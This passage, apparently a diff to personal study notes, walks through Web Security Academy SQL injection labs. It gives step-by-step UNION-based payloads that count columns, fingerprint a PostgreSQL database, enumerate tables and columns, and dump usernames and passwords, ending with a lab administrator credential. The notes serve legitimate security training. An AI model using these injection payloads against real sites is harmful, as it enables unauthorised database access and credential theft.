@@ -84,3 +84,53 @@ Query and database details get reflected on the page
 
 with our database version in mind retrieve all username and passwords as follows:
 https://acc91fed1f128145c03d103200d8002c.web-security-academy.net/filter?category=Tech+gifts'UNION select NULL,username|| '*' || password from users--
+
+
+Lab #9 - SQL Injections attack listing database contents on a non-oracle database
+
+End Goals:
+- Determine the table that contains username and passwords
+- Output the contents of the table
+-  Login as adminstrator
+
+Steps to Reproduce:
+
+1. Find the number of columns
+
+https://ac501f031fb27988c01106bf008d00f4.web-security-academy.net/filter?category=Pets' ORDER BY 3--
+ORDER BY 3-- -> cause an internal server error
+therefore number of columns = 3-1 = 2
+columns =2
+
+2. Find the data type of the columns
+'UNION select 'a','a'--
+We get a 200 OK 'a' and 'a' are reflected on the page because the correspond with the datatype of our columns
+
+3. Confirm the database version
+
+'UNION SELECT @@version,NULL--
+We get an error confirming that it is not a Microsoft Database that we are dealing with
+NB// The null is included in the query as a placeholder for the second column, remember our database has 2 columns
+
+'UNION SELECT version(),NULL--
+We get a 200 Ok , confirming that it is a Postgres Database
+
+POSTGRESQL 11.11(Debian)
+4. Output the list of table names in the database
+'UNION select table_name,NULL from information_schema.tables--
+
+users_xdwsxl - in our case this is our table of interest
+
+5. Output the column names of the table
+
+' UNION select column_name, NULL from information_schema.columns WHERE table_name = 'users_xdwsxl'--
+
+username_amznqg
+password_hbzemh
+
+6. Output the usernmae and passwords
+
+' UNION select username_amznqg,password_hbzemh from users_xdwsxl--
+
+administrator
+l1em8s82jv6f0y78aw3h
